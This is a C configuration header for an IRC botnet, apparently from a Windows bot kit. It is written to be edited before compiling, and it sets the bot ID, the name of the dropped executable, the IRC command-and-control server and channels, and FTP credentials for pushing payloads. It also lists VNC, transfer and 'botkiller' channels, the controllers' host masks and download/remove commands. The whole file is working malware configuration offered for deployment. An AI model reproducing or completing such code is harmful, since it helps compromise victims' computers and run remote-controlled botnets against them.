/////////////
//EDIT HERE//
/////////////

//Bot ID, change this everytime you compile! Can contain random chars, numbers...
char BotID[] = "H1d3WoRK";

unsigned long mutex_time = 33334; // msec

//Bot file name (save as what name)
char FileName[] = "quer23.exe";

//IRC servers (you can specify as many as you want servers)
//Hostname or IP, port, TRUE/FALSE to use server pass, server pass
IRCSERVERLIST IrcServerList[] = {
	{"irc.serv.com", 6667, FALSE, "pass"},
	{NULL, 0, FALSE, NULL}
};

int reconnect_time = 5000; // msec
int MaxWaitTime = 300; //sec

//Length of nick (how many chars)
unsigned int NickLen = 7;

//Prefix for orders (can be more than 1 char)
char OrderPrefix[] = ".";

char Chan[] = "#dbot";
BOOL UseChanPass = TRUE;
char ChanPass[] = "pass";
char VNCChan[] = "#dbot";
char TransferChannel[] = "#dbot#";
char InfoChan[] = "#dbot#";

//botkiller
char BKChan[] = "#dbot";		//channel where botkilling messages get redirected

// for ftpd server
char FTPUser[] = "h1dd3n-DreamWoRK";
char FTPPass[] = "1234";

// default cftp values
char CFTPHost[32] = "IP";
int CFTPPort = 21;
char CFTPUser[32] = "user";
char CFTPPass[32] = "pass";
char CFTPPath[32] = "filepatch";
//char CFTPHoldr[32];
char CFTPFile[32] = "exename.exe";


//Auth host - MUST use, since bot has no login! MD5 hash only! DO NOT INCLUDE THE @ IT IS SET FOR fbi.gov right now
char *AuthHosts[] = {
	"*@CYBER-TERROR.COM",
	NULL
};

//Custom commands (MD5 hashes only!) THESE ARE STAND. download & remove... feel free to change tho..
char Command_Remove[] = "remove"; //
char Command_Download[] = "download"; //

